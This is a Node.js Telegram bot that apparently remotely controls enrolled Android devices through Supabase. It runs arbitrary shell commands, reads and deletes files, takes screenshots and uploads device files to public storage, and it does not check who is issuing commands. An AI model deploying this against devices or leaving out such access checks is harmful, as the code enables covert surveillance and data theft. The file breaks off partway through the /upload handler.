import http from "http";
import { createClient } from "@supabase/supabase-js";
import TelegramBot from "node-telegram-bot-api";

const BOT_TOKEN = process.env.BOT_TOKEN;
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY;
const WEBHOOK_URL = process.env.WEBHOOK_URL; // e.g. https://your-app.onrender.com
const PORT = parseInt(process.env.PORT || "3000", 10);

if (!BOT_TOKEN) throw new Error("Missing BOT_TOKEN");
if (!SUPABASE_URL) throw new Error("Missing SUPABASE_URL");
if (!SUPABASE_SERVICE_KEY) throw new Error("Missing SUPABASE_SERVICE_KEY (service role)");
if (!WEBHOOK_URL) throw new Error("Missing WEBHOOK_URL (HTTPS)");

const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY, {
  realtime: { params: { eventsPerSecond: 50 } },
});

// webhook (no polling)
const bot = new TelegramBot(BOT_TOKEN, { polling: false });

/* in-memory state */
const chatState = new Map(); // chatId -> { deviceId, cwd }
const pendingSubs = new Map(); // cmdId -> { resolve,reject,timeout,sub,poll, promise }

/* ===== Upload button state ===== */
const fileActions = new Map();
const groupActions = new Map();
const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000;

function generateToken() {
  return Math.random().toString(36).slice(2, 8) + Date.now().toString(36).slice(-4);
}

function humanSize(bytes) {
  if (bytes == null) return "unknown";
  const b = Number(bytes);
  if (!b) return "0b";
  if (b < 1024) return `${b}b`;
  if (b < 1024 ** 2) return `${Math.round(b / 1024)}kb`;
  if (b < 1024 ** 3) return `${Math.round(b / 1024 ** 2)}mb`;
  return `${Math.round(b / 1024 ** 3)}gb`;
}

/* ===========================
   Helpers / Formatters
   =========================== */

function resolvePath(cwd, input) {
  if (!input || input.trim() === "") return cwd;
  const p = String(input).trim();
  if (p.startsWith("/")) return p;
  if (p === "..") {
    const parts = cwd.split("/").filter(Boolean);
    parts.pop();
    return "/" + parts.join("/");
  }
  return `${cwd.replace(/\/+$/, "")}/${p}`;
}

function chunkMessage(text, max = 3800) {
  const parts = [];
  for (let i = 0; i < text.length; i += max) parts.push(text.slice(i, i + max));
  return parts;
}

function safeString(s) {
  if (s === null || s === undefined) return "";
  return String(s);
}

function formatBytes(bytes) {
  if (bytes === null || bytes === undefined) return "";
  bytes = Number(bytes);
  if (!bytes || bytes === 0) return "0 B";
  const k = 1024;
  const sizes = ["B", "KB", "MB", "GB", "TB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return (bytes / Math.pow(k, i)).toFixed(2) + " " + sizes[i];
}

function timeAgo(date) {
  const diff = Math.floor((Date.now() - new Date(date)) / 1000);

  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)} mins ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)} hrs ago`;
  return `${Math.floor(diff / 86400)} days ago`;
}

// Shorter last-seen text, used in device button label (e.g. "3h ago" or "45m ago")
function shortAgo(date) {
  try {
    const diff = Math.floor((Date.now() - new Date(date).getTime()) / 1000);
    if (diff < 60) return `${diff}s ago`;
    if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
    if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
    return `${Math.floor(diff / 86400)}d ago`;
  } catch (e) {
    return "";
  }
}

function formatInfo(obj, deviceId) {
  const lines = [];

  // Device ID
  if (deviceId) {
    lines.push(`📱 Device: ${safeString(deviceId)}`);
  }

  // Model
  if (obj.manufacturer || obj.model) {
    const model = [obj.manufacturer, obj.model].filter(Boolean).join(" ");
    lines.push(`📦 Model: ${safeString(model)}`);
  }

  // Android version
  if (obj.android_version) {
    const sdk = obj.sdk ? ` (SDK ${safeString(obj.sdk)})` : "";
    lines.push(`🤖 Android: ${safeString(obj.android_version)}${sdk}`);
  }

  // Physical device
  if (obj.is_physical_device !== undefined) {
    lines.push(
      `🧠 Physical: ${obj.is_physical_device ? "Yes" : "No"}`
    );
  }

  // Online status (from DB or payload)
  if (obj.online !== undefined) {
    lines.push(
      `${obj.online ? "🟢 Online" : "🔴 Offline"}`
    );
  }

  // Last seen (human readable)
  if (obj.last_seen) {
    lines.push(`🕒 Last seen: ${timeAgo(obj.last_seen)}`);
  }

  return lines.join("\n");
}

// formatListingPlain returns a string (one item per line, folders first) - KEEPING AS IS
function formatListingPlain(result) {
  if (!result) return "";

  const folders = [];
  const files = [];

  // Preferred shape: result.entries = [{name, path, type}, ...]
  if (Array.isArray(result.entries)) {
    for (const e of result.entries) {
      const t = (e.type || "").toString().toLowerCase();
      const name = safeString(e.name || e.path || "");
      if (!name) continue;
      if (t === "dir" || t === "directory" || (e.path && e.path.endsWith("/"))) folders.push(name.replace(/\/+$/, ""));
      else files.push(name.replace(/\/+$/, ""));
    }
  }
  // Older shape: result.folders & result.files
  else if (Array.isArray(result.folders) || Array.isArray(result.files)) {
    if (Array.isArray(result.folders)) folders.push(...result.folders.map(s => safeString(s).replace(/\/+$/, "")));
    if (Array.isArray(result.files)) files.push(...result.files.map(s => safeString(s).replace(/\/+$/, "")));
  }
  // If result is a simple array of names
  else if (Array.isArray(result)) {
    result.forEach(r => {
      const s = safeString(r);
      if (s) files.push(s.replace(/\/+$/, ""));
    });
  } else {
    // unknown shape: stringify nicely
    try {
      return JSON.stringify(result, null, 2) + "\n";
    } catch (e) {
      return String(result) + "\n";
    }
  }

  // sort and build lines
  folders.sort((a, b) => a.localeCompare(b));
  files.sort((a, b) => a.localeCompare(b));

  const lines = [
    ...folders.map(n => `📁 ${n}`),
    ...files.map(n => `${n}`)
  ];

  return lines.join("\n") + (lines.length ? "\n" : "");
}

/* ===========================
   DB helpers (adjusted for offline-queue behavior)
   =========================== */

async function validateDevice(deviceId) {
  try {
    const { data, error } = await supabase
      .from("devices")
      .select("id, online, consent, enabled, last_seen")
      .eq("id", deviceId)
      .maybeSingle();

    if (error) {
      console.error("Validate device error:", error);
      return { ok: false, error: error.message };
    }
    if (!data) return { ok: false, error: "device_not_found" };
    if (!data.consent) return { ok: false, error: "device_no_consent" };
    if (!data.enabled) return { ok: false, error: "device_disabled" };

    // IMPORTANT: we no longer fail on offline. We return online flag so callers decide.
    return { ok: true, online: !!data.online, last_seen: data.last_seen };
  } catch (e) {
    console.error("Validate device exception:", e);
    return { ok: false, error: String(e) };
  }
}

/**
 * Get selected device for chat, with validation
 * Returns { deviceId, online } or null
 */
async function getSelectedDevice(chatId) {
  const st = chatState.get(chatId);
  if (!st?.deviceId) {
    await bot.sendMessage(chatId, "❌ No device selected. Use /use <device_id>");
    return null;
  }

  const v = await validateDevice(st.deviceId);
  if (!v.ok) {
    await bot.sendMessage(chatId, `❌ Device invalid: ${v.error}`);
    chatState.delete(chatId);
    return null;
  }

  if (!v.online) {
    // Inform user but still proceed (we'll queue & wait long-poll)
    await bot.sendMessage(chatId, "⚠️ Device is currently offline — commands will be queued and delivered when it reconnects. I will wait for a result for up to 7 days.");
  }

  return { deviceId: st.deviceId, online: !!v.online };
}

/**
 * Insert command into DB
 */
async function sendCommand(deviceId, action, payload = {}) {
  const { data, error } = await supabase
    .from("commands")
    .insert({
      device_id: deviceId,
      action,
      payload,
      status: "pending",
    })
    .select("id, created_at")
    .single();

  if (error) throw new Error(`sendCommand failed: ${error.message}`);
  return data;
}

/**
 * Unwrap result
 */
function unwrapResult(res) {
  if (!res) return null;
  if (typeof res.result === "object" && res.result !== null) return res.result;
  try {
    return JSON.parse(res.result);
  } catch {
    return res.result;
  }
}

/**
 * Wait for command result using realtime + polling fallback (up to timeout)
 */
function waitForResultRealtime(commandId, timeout = 30_000) {
  return new Promise((resolve, reject) => {
    let done = false;
    let timeoutHandle = null;
    let pollHandle = null;
    let channel = null;

    const cleanup = () => {
      if (timeoutHandle) clearTimeout(timeoutHandle);
      if (pollHandle) clearInterval(pollHandle);
      if (channel) {
        supabase.removeChannel(channel);
      }
      pendingSubs.delete(commandId);
      done = true;
    };

    const finalize = (res, err) => {
      if (done) return;
      cleanup();
      if (err) reject(err);
      else resolve(res);
    };

    // Set overall timeout
    timeoutHandle = setTimeout(() => {
      finalize(null, new Error(`Command timeout after ${timeout}ms`));
    }, timeout);

    // Realtime subscription
    channel = supabase
      .channel(`cmd-${commandId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "commands",
          filter: `id=eq.${commandId}`,
        },
        (payload) => {
          if (done) return;
          const newRow = payload.new;
          if (newRow.status === "completed" || newRow.status === "failed") {
            finalize(newRow, null);
          }
        }
      )
      .subscribe((status) => {
        if (status === "SUBSCRIBED") {
          console.log(`Realtime subscribed for command ${commandId}`);
        }
      });

    // Polling fallback every 2s
    pollHandle = setInterval(async () => {
      if (done) return;
      try {
        const { data, error } = await supabase
          .from("commands")
          .select("id, status, result, error, updated_at")
          .eq("id", commandId)
          .maybeSingle();

        if (error) {
          console.error("Poll error:", error);
          return;
        }
        if (!data) {
          console.warn(`Command ${commandId} not found in poll`);
          return;
        }
        if (data.status === "completed" || data.status === "failed") {
          finalize(data, null);
        }
      } catch (e) {
        console.error("Poll exception:", e);
      }
    }, 2000);

    // Store reference
    pendingSubs.set(commandId, {
      resolve,
      reject,
      timeout: timeoutHandle,
      poll: pollHandle,
      sub: channel,
      promise: { cleanup, finalize },
    });
  });
}

/* ===========================
   Command Handlers
   =========================== */

// /start
bot.onText(/^\/start$/i, async (msg) => {
  const welcome = `👋 Welcome to Device Remote Bot!

📱 Commands:
/devices - List all devices
/use <device_id> - Select a device
/ls [path] - List files
/cd <path> - Change directory
/pwd - Print working directory
/cat <file> - Read file
/exec <command> - Execute shell command
/upload <path> - Upload file to storage
/send <path> - Quick upload
/ping - Ping device
/info - Device information
/help - Show all commands`;

  await bot.sendMessage(msg.chat.id, welcome);
});

// /help
bot.onText(/^\/help$/i, async (msg) => {
  const help = `🔧 Available Commands:

📂 File Operations:
/ls [path] - List directory
/cd <path> - Change directory  
/pwd - Current directory
/cat <file> - Read file content
/rm <path> - Delete file/folder
/mkdir <path> - Create directory
/mv <from> <to> - Move/rename
/cp <from> <to> - Copy file

⚙️ System:
/exec <cmd> - Execute command
/ping - Test connection
/info - Device info
/battery - Battery status
/screenshot - Take screenshot

☁️ Upload:
/upload <path> - Upload to storage
/send <path> - Quick send

🔌 Device:
/devices - List devices
/use <id> - Select device

💡 Tip: Use /ls to browse files with clickable buttons!`;

  await bot.sendMessage(msg.chat.id, help);
});

// /devices - show inline buttons for device selection
bot.onText(/^\/devices$/i, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const { data, error } = await supabase
      .from("devices")
      .select("id, online, consent, enabled, last_seen")
      .order("last_seen", { ascending: false });

    if (error) {
      await bot.sendMessage(chatId, `❌ Database error: ${error.message}`);
      return;
    }

    if (!data || data.length === 0) {
      await bot.sendMessage(chatId, "No devices found.");
      return;
    }

    // Build inline keyboard with device buttons
    const keyboard = [];
    for (const d of data) {
      if (!d.consent || !d.enabled) continue;

      const status = d.online ? "🟢" : "🔴";
      const ago = d.last_seen ? shortAgo(d.last_seen) : "n/a";
      const label = `${status} ${d.id} (${ago})`;

      keyboard.push([{ text: label, callback_data: `select_device:${d.id}` }]);
    }

    if (keyboard.length === 0) {
      await bot.sendMessage(chatId, "No enabled/consented devices.");
      return;
    }

    await bot.sendMessage(chatId, "📱 Select a device:", {
      reply_markup: { inline_keyboard: keyboard }
    });
  } catch (e) {
    console.error("devices error:", e);
    await bot.sendMessage(chatId, `❌ Error: ${e.message || e}`);
  }
});

// Handle device selection callback
bot.on("callback_query", async (q) => {
  const chatId = q.message?.chat?.id;
  if (!chatId) return;

  try {
    const data = q.data || "";

    // Device selection
    if (data.startsWith("select_device:")) {
      const deviceId = data.replace("select_device:", "");
      
      // Validate device
      const v = await validateDevice(deviceId);
      if (!v.ok) {
        await bot.answerCallbackQuery(q.id, { text: `❌ Invalid: ${v.error}`, show_alert: true });
        return;
      }

      // Set device for this chat
      if (!chatState.has(chatId)) {
        chatState.set(chatId, { deviceId, cwd: "/sdcard" });
      } else {
        const st = chatState.get(chatId);
        st.deviceId = deviceId;
        st.cwd = "/sdcard";
      }

      const status = v.online ? "🟢 Online" : "🔴 Offline";
      await bot.answerCallbackQuery(q.id, { text: `✅ Selected ${deviceId}` });
      await bot.sendMessage(chatId, `✅ Device selected: ${deviceId}\n${status}\n\nUse /ls to browse files or /help for commands.`);
      return;
    }

    // File/folder navigation from /ls
    if (data.startsWith("nav:")) {
      const path = data.replace("nav:", "");
      const st = chatState.get(chatId);
      if (st) {
        st.cwd = path;
        await bot.answerCallbackQuery(q.id);
        
        // Auto-execute /ls for new path
        const sel = await getSelectedDevice(chatId);
        if (!sel) return;
        const { deviceId, online } = sel;

        const cmd = await sendCommand(deviceId, "list_files", { path });
        const timeout = online ? 30_000 : SEVEN_DAYS_MS;
        
        if (!online) {
          await bot.sendMessage(chatId, `⚠️ Device offline — ls queued. Waiting...`);
        }

        const res = await waitForResultRealtime(cmd.id, timeout);
        const payload = unwrapResult(res);

        if (payload && (payload.entries || payload.folders || payload.files)) {
          const listing = formatListingPlain(payload);
          if (listing.trim()) {
            const text = `📁 ${path}\n\n${listing}`;
            for (const chunk of chunkMessage(text)) {
              await bot.sendMessage(chatId, chunk);
            }
          } else {
            await bot.sendMessage(chatId, `📁 ${path}\n\n(empty)`);
          }
        } else {
          await bot.sendMessage(chatId, `📁 ${path}\n\nNo listing data.`);
        }
      }
      return;
    }

    // Upload file actions
    if (data.startsWith("upload_file:") || data.startsWith("skip_file:") || 
        data.startsWith("upload_all:") || data.startsWith("skip_all:")) {
      
      // Single file upload
      if (data.startsWith("upload_file:")) {
        const token = data.replace("upload_file:", "");
        const action = fileActions.get(token);
        
        if (!action) {
          await bot.answerCallbackQuery(q.id, { text: "❌ Action expired", show_alert: true });
          return;
        }

        const { chatId: actChatId, deviceId, path, bucket, dest, msgId } = action;
        
        try {
          await bot.answerCallbackQuery(q.id, { text: "⏳ Uploading..." });
          await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: actChatId, message_id: msgId });

          const cmd = await sendCommand(deviceId, "upload_file", { path, bucket, dest });
          const v = await validateDevice(deviceId);
          const timeout = v.online ? 120_000 : SEVEN_DAYS_MS;
          
          const res = await waitForResultRealtime(cmd.id, timeout);
          const payload = unwrapResult(res) ?? {};

          const success = payload.success === true || payload.publicUrl || payload.public_url || payload.url;
          if (success) {
            const url = payload.publicUrl || payload.public_url || payload.url;
            const size = payload.size ? formatBytes(payload.size) : "unknown";
            await bot.sendMessage(actChatId, `✅ Uploaded\n📁 ${dest}\n📊 ${size}${url ? `\n🔗 ${url}` : ""}`);
          } else {
            const errorMsg = payload.error || payload.detail || "Unknown error";
            await bot.sendMessage(actChatId, `❌ Upload failed: ${errorMsg}`);
          }
        } catch (e) {
          await bot.sendMessage(actChatId, `❌ Upload error: ${e.message || e}`);
        }

        fileActions.delete(token);
        return;
      }

      // Skip file
      if (data.startsWith("skip_file:")) {
        const token = data.replace("skip_file:", "");
        const action = fileActions.get(token);
        
        if (!action) {
          await bot.answerCallbackQuery(q.id, { text: "❌ Action expired", show_alert: true });
          return;
        }

        const { chatId: actChatId, msgId } = action;
        
        await bot.answerCallbackQuery(q.id, { text: "⏭️ Skipped" });
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: actChatId, message_id: msgId });
        await bot.sendMessage(actChatId, "⏭️ File skipped.");
        
        fileActions.delete(token);
        return;
      }

      // Upload all files in group
      if (data.startsWith("upload_all:")) {
        const gtoken = data.replace("upload_all:", "");
        const groupAction = groupActions.get(gtoken);
        
        if (!groupAction) {
          await bot.answerCallbackQuery(q.id, { text: "❌ Action expired", show_alert: true });
          return;
        }

        const { chatId: actChatId, deviceId, list, bucket, msgId } = groupAction;
        
        await bot.answerCallbackQuery(q.id, { text: "⏳ Uploading all..." });
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: actChatId, message_id: msgId });

        for (const item of list) {
          const { path } = item;
          const destName = (path.split("/").pop() || "file").replace(/\s+/g, "_");
          const dest = `${deviceId}/${Date.now()}_${destName}`;

          try {
            await bot.sendMessage(actChatId, `📤 Uploading: ${path}...`);
            
            const cmd = await sendCommand(deviceId, "upload_file", { path, bucket, dest });
            const v = await validateDevice(deviceId);
            const timeout = v.online ? 120_000 : SEVEN_DAYS_MS;
            
            const res = await waitForResultRealtime(cmd.id, timeout);
            const payload = unwrapResult(res) ?? {};

            const success = payload.success === true || payload.publicUrl || payload.public_url || payload.url;
            if (success) {
              const url = payload.publicUrl || payload.public_url || payload.url;
              const size = payload.size ? formatBytes(payload.size) : "unknown";
              await bot.sendMessage(actChatId, `✅ ${path}\n${size}${url ? ` - ${url}` : ""}`);
            } else {
              await bot.sendMessage(actChatId, `❌ Failed: ${path}`);
            }
          } catch (e) {
            await bot.sendMessage(actChatId, `❌ Error: ${path} - ${e.message}`);
          }
        }

        await bot.sendMessage(actChatId, `🏁 Upload-all finished for ${list.length} files.`);
        groupActions.delete(gtoken);
        return;
      }

      // Skip all
      if (data.startsWith("skip_all:")) {
        const gtoken = data.replace("skip_all:", "");
        const groupAction = groupActions.get(gtoken);
        
        if (!groupAction) {
          await bot.answerCallbackQuery(q.id, { text: "❌ Action expired", show_alert: true });
          return;
        }

        const { chatId: actChatId, list, msgId } = groupAction;
        
        await bot.answerCallbackQuery(q.id, { text: "⏭️ Skipped all" });
        await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: actChatId, message_id: msgId });
        await bot.sendMessage(actChatId, `⏭️ Skipped all ${list.length} files.`);
        
        groupActions.delete(gtoken);
        return;
      }
    }

  } catch (e) {
    console.error("callback_query error:", e);
    try {
      await bot.answerCallbackQuery(q.id, { text: `❌ Error`, show_alert: true });
    } catch (_) {}
  }
});

// /use <device_id>
bot.onText(/^\/use\s+(.+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const deviceId = m[1].trim();

  const v = await validateDevice(deviceId);
  if (!v.ok) {
    await bot.sendMessage(chatId, `❌ Device invalid: ${v.error}`);
    return;
  }

  if (!chatState.has(chatId)) {
    chatState.set(chatId, { deviceId, cwd: "/sdcard" });
  } else {
    const st = chatState.get(chatId);
    st.deviceId = deviceId;
    st.cwd = "/sdcard";
  }

  const status = v.online ? "🟢 Online" : "🔴 Offline";
  await bot.sendMessage(chatId, `✅ Using device: ${deviceId}\n${status}`);
});

// /pwd
bot.onText(/^\/pwd$/i, async (msg) => {
  const st = chatState.get(msg.chat.id);
  if (!st) {
    await bot.sendMessage(msg.chat.id, "❌ No device selected. Use /use <device_id>");
    return;
  }
  await bot.sendMessage(msg.chat.id, `📁 ${st.cwd}`);
});

// /cd
bot.onText(/^\/cd\s+(.+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const st = chatState.get(chatId);
  if (!st) {
    await bot.sendMessage(chatId, "❌ No device selected");
    return;
  }

  const requested = m[1].trim();
  st.cwd = resolvePath(st.cwd, requested);
  await bot.sendMessage(chatId, `📁 ${st.cwd}`);
});

// /ls [path]
bot.onText(/^\/ls(?:\s+(.+))?$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const sel = await getSelectedDevice(chatId);
  if (!sel) return;

  const { deviceId, online } = sel;
  const st = chatState.get(chatId);

  const requested = m[1] ? m[1].trim() : "";
  const path = resolvePath(st.cwd, requested);

  try {
    const cmd = await sendCommand(deviceId, "list_files", { path });
    const timeout = online ? 30_000 : SEVEN_DAYS_MS;

    if (!online) {
      await bot.sendMessage(chatId, `⚠️ Device offline — ls queued. Waiting for result (up to 7 days)...`);
    }

    const res = await waitForResultRealtime(cmd.id, timeout);
    const payload = unwrapResult(res);

    if (st) st.cwd = path;

    if (payload && (payload.entries || payload.folders || payload.files)) {
      const listing = formatListingPlain(payload);
      if (listing.trim()) {
        const text = `📁 ${path}\n\n${listing}`;
        for (const chunk of chunkMessage(text)) {
          await bot.sendMessage(chatId, chunk);
        }
      } else {
        await bot.sendMessage(chatId, `📁 ${path}\n\n(empty)`);
      }
    } else {
      await bot.sendMessage(chatId, `📁 ${path}\n\nNo listing data returned.`);
    }
  } catch (e) {
    console.error("ls error:", e);
    bot.sendMessage(chatId, `❌ ls failed: ${e.message || e}`);
  }
});

// /cat
bot.onText(/^\/cat\s+(.+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const sel = await getSelectedDevice(chatId);
  if (!sel) return;

  const { deviceId, online } = sel;
  const st = chatState.get(chatId);
  const requested = m[1].trim();
  const path = resolvePath(st.cwd, requested);

  try {
    const cmd = await sendCommand(deviceId, "read_file", { path });
    const timeout = online ? 30_000 : SEVEN_DAYS_MS;

    if (!online) {
      await bot.sendMessage(chatId, `⚠️ Device offline — cat queued. Waiting...`);
    }

    const res = await waitForResultRealtime(cmd.id, timeout);
    const payload = unwrapResult(res) ?? {};

    const content = payload.content || payload.text || "";
    if (content) {
      const text = `📄 ${path}\n\n${content}`;
      for (const chunk of chunkMessage(text, 3800)) {
        await bot.sendMessage(chatId, chunk);
      }
    } else {
      bot.sendMessage(chatId, `📄 ${path}\n\n(empty or binary)`);
    }
  } catch (e) {
    console.error("cat error:", e);
    bot.sendMessage(chatId, `❌ cat failed: ${e.message || e}`);
  }
});

// /exec
bot.onText(/^\/exec\s+(.+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const sel = await getSelectedDevice(chatId);
  if (!sel) return;

  const { deviceId, online } = sel;
  const command = m[1].trim();

  try {
    const cmd = await sendCommand(deviceId, "shell_exec", { command });
    const timeout = online ? 60_000 : SEVEN_DAYS_MS;

    if (!online) {
      await bot.sendMessage(chatId, `⚠️ Device offline — command queued. Waiting...`);
    }

    const res = await waitForResultRealtime(cmd.id, timeout);
    const payload = unwrapResult(res) ?? {};

    const output = payload.output || payload.stdout || payload.result || "(no output)";
    const exitCode = payload.exitCode !== undefined ? payload.exitCode : payload.exit_code;

    let text = `💻 $ ${command}\n\n${output}`;
    if (exitCode !== undefined) text += `\n\n🔢 Exit code: ${exitCode}`;

    for (const chunk of chunkMessage(text)) {
      await bot.sendMessage(chatId, chunk);
    }
  } catch (e) {
    console.error("exec error:", e);
    bot.sendMessage(chatId, `❌ exec failed: ${e.message || e}`);
  }
});

// /rm
bot.onText(/^\/rm\s+(.+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const sel = await getSelectedDevice(chatId);
  if (!sel) return;

  const { deviceId, online } = sel;
  const st = chatState.get(chatId);
  const requested = m[1].trim();
  const path = resolvePath(st.cwd, requested);

  try {
    const cmd = await sendCommand(deviceId, "delete_file", { path });
    const timeout = online ? 30_000 : SEVEN_DAYS_MS;

    if (!online) {
      await bot.sendMessage(chatId, `⚠️ Device offline — rm queued. Waiting...`);
    }

    const res = await waitForResultRealtime(cmd.id, timeout);
    const payload = unwrapResult(res) ?? {};

    if (payload.success) {
      await bot.sendMessage(chatId, `✅ Deleted: ${path}`);
    } else {
      const error = payload.error || "Unknown error";
      await bot.sendMessage(chatId, `❌ Failed to delete: ${error}`);
    }
  } catch (e) {
    console.error("rm error:", e);
    bot.sendMessage(chatId, `❌ rm failed: ${e.message || e}`);
  }
});

// /mkdir
bot.onText(/^\/mkdir\s+(.+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const sel = await getSelectedDevice(chatId);
  if (!sel) return;

  const { deviceId, online } = sel;
  const st = chatState.get(chatId);
  const requested = m[1].trim();
  const path = resolvePath(st.cwd, requested);

  try {
    const cmd = await sendCommand(deviceId, "create_directory", { path });
    const timeout = online ? 30_000 : SEVEN_DAYS_MS;

    if (!online) {
      await bot.sendMessage(chatId, `⚠️ Device offline — mkdir queued. Waiting...`);
    }

    const res = await waitForResultRealtime(cmd.id, timeout);
    const payload = unwrapResult(res) ?? {};

    if (payload.success) {
      await bot.sendMessage(chatId, `✅ Directory created: ${path}`);
    } else {
      const error = payload.error || "Unknown error";
      await bot.sendMessage(chatId, `❌ Failed: ${error}`);
    }
  } catch (e) {
    console.error("mkdir error:", e);
    bot.sendMessage(chatId, `❌ mkdir failed: ${e.message || e}`);
  }
});

// /mv
bot.onText(/^\/mv\s+(.+?)\s+(.+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const sel = await getSelectedDevice(chatId);
  if (!sel) return;

  const { deviceId, online } = sel;
  const st = chatState.get(chatId);
  const from = resolvePath(st.cwd, m[1].trim());
  const to = resolvePath(st.cwd, m[2].trim());

  try {
    const cmd = await sendCommand(deviceId, "move_file", { from, to });
    const timeout = online ? 30_000 : SEVEN_DAYS_MS;

    if (!online) {
      await bot.sendMessage(chatId, `⚠️ Device offline — mv queued. Waiting...`);
    }

    const res = await waitForResultRealtime(cmd.id, timeout);
    const payload = unwrapResult(res) ?? {};

    if (payload.success) {
      await bot.sendMessage(chatId, `✅ Moved: ${from} → ${to}`);
    } else {
      const error = payload.error || "Unknown error";
      await bot.sendMessage(chatId, `❌ Failed: ${error}`);
    }
  } catch (e) {
    console.error("mv error:", e);
    bot.sendMessage(chatId, `❌ mv failed: ${e.message || e}`);
  }
});

// /cp
bot.onText(/^\/cp\s+(.+?)\s+(.+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const sel = await getSelectedDevice(chatId);
  if (!sel) return;

  const { deviceId, online } = sel;
  const st = chatState.get(chatId);
  const from = resolvePath(st.cwd, m[1].trim());
  const to = resolvePath(st.cwd, m[2].trim());

  try {
    const cmd = await sendCommand(deviceId, "copy_file", { from, to });
    const timeout = online ? 30_000 : SEVEN_DAYS_MS;

    if (!online) {
      await bot.sendMessage(chatId, `⚠️ Device offline — cp queued. Waiting...`);
    }

    const res = await waitForResultRealtime(cmd.id, timeout);
    const payload = unwrapResult(res) ?? {};

    if (payload.success) {
      await bot.sendMessage(chatId, `✅ Copied: ${from} → ${to}`);
    } else {
      const error = payload.error || "Unknown error";
      await bot.sendMessage(chatId, `❌ Failed: ${error}`);
    }
  } catch (e) {
    console.error("cp error:", e);
    bot.sendMessage(chatId, `❌ cp failed: ${e.message || e}`);
  }
});

// /battery
bot.onText(/^\/battery$/i, async (msg) => {
  const chatId = msg.chat.id;
  const sel = await getSelectedDevice(chatId);
  if (!sel) return;

  const { deviceId, online } = sel;

  try {
    const cmd = await sendCommand(deviceId, "battery_info");
    const timeout = online ? 20_000 : SEVEN_DAYS_MS;

    if (!online) {
      await bot.sendMessage(chatId, `⚠️ Device offline — battery queued. Waiting...`);
    }

    const res = await waitForResultRealtime(cmd.id, timeout);
    const payload = unwrapResult(res) ?? {};

    const level = payload.level !== undefined ? `${payload.level}%` : "unknown";
    const charging = payload.charging ? "⚡ Charging" : "🔋 Not charging";
    const health = payload.health || "unknown";

    await bot.sendMessage(chatId, `🔋 Battery: ${level}\n${charging}\n🏥 Health: ${health}`);
  } catch (e) {
    console.error("battery error:", e);
    bot.sendMessage(chatId, `❌ battery failed: ${e.message || e}`);
  }
});

// /screenshot
bot.onText(/^\/screenshot$/i, async (msg) => {
  const chatId = msg.chat.id;
  const sel = await getSelectedDevice(chatId);
  if (!sel) return;

  const { deviceId, online } = sel;

  try {
    await bot.sendMessage(chatId, "📸 Taking screenshot...");
    
    const cmd = await sendCommand(deviceId, "screenshot");
    const timeout = online ? 60_000 : SEVEN_DAYS_MS;

    if (!online) {
      await bot.sendMessage(chatId, `⚠️ Device offline — screenshot queued. Waiting...`);
    }

    const res = await waitForResultRealtime(cmd.id, timeout);
    const payload = unwrapResult(res) ?? {};

    if (payload.url || payload.publicUrl || payload.public_url) {
      const url = payload.url || payload.publicUrl || payload.public_url;
      await bot.sendMessage(chatId, `✅ Screenshot captured!\n🔗 ${url}`);
    } else {
      const error = payload.error || "No URL returned";
      await bot.sendMessage(chatId, `❌ Screenshot failed: ${error}`);
    }
  } catch (e) {
    console.error("screenshot error:", e);
    bot.sendMessage(chatId, `❌ screenshot failed: ${e.message || e}`);
  }
});

// /send <path> (upload helper)
bot.onText(/^\/send\s+(.+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const sel = await getSelectedDevice(chatId);
  if (!sel) return;
  const { deviceId, online } = sel;
  const st = chatState.get(chatId);
  const requested = m[1].trim();
  const path = resolvePath(st.cwd, requested);

  await bot.sendMessage(chatId, "📤 Sending file...");
  try {
    const destName = (path.split("/").pop() || "file").replace(/\s+/g, "_");
    const dest = `${deviceId}/${Date.now()}_${destName}`;
    const bucket = "device-uploads";

    const cmd = await sendCommand(deviceId, "upload_file", { path, bucket, dest });
    const timeout = online ? 120_000 : SEVEN_DAYS_MS;
    if (!online) await bot.sendMessage(chatId, `⚠️ Device offline — upload queued. Waiting (up to 7 days)...`);

    const res = await waitForResultRealtime(cmd.id, timeout);
    const payload = unwrapResult(res) ?? {};

    const success = payload.success === true || payload.publicUrl || payload.public_url || payload.url;
    if (!success) {
      const errorMsg = payload.error || payload.detail || "Unknown error";
      await bot.sendMessage(chatId, `❌ Upload failed: ${errorMsg}`);
      return;
    }

    const publicUrl = payload.publicUrl || payload.public_url || payload.url;
    const actualDest = payload.path || payload.dest || dest;
    const size = payload.size ? formatBytes(payload.size) : "unknown size";

    if (publicUrl) {
      await bot.sendMessage(chatId, `✅ File uploaded\n📁 ${actualDest}\n📊 ${size}\n🔗 ${publicUrl}`);
    } else {
      await bot.sendMessage(chatId, `✅ File uploaded to ${actualDest} (${size})`);
    }
  } catch (e) {
    console.error("send error:", e);
    bot.sendMessage(chatId, `❌ Error: ${e.message || e}`);
  }
});

// /upload (edge function)
bot.onText(/^\/upload\s+(.+)$/i, async (msg, m) => {
  const chatId = msg.chat.id;
  const sel = await getSelectedDevice(chatId);
  if (!sel) return;
  const { deviceId, online } = sel;
  const st = chatState.get(chatId);
  const requested = m[1].trim();
  const path = resolvePath(st.cwd, requested);

